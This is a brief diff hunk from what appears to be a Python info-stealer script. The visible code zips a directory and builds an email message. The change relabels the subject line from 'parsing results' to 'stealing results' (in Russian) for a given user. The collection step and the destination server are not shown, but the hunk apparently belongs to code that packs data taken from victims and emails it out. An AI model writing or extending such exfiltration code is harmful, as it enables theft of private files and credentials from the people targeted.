@@ -86,7 +86,7 @@ try:
 
     shutil.make_archive(zip_name, 'zip', directory_name)
 
-    subject = rf"Результаты парсинга {user}"
+    subject = rf"Результаты стиллинга {user}"
     body = "Ку"
 
     message = MIMEMultipart()
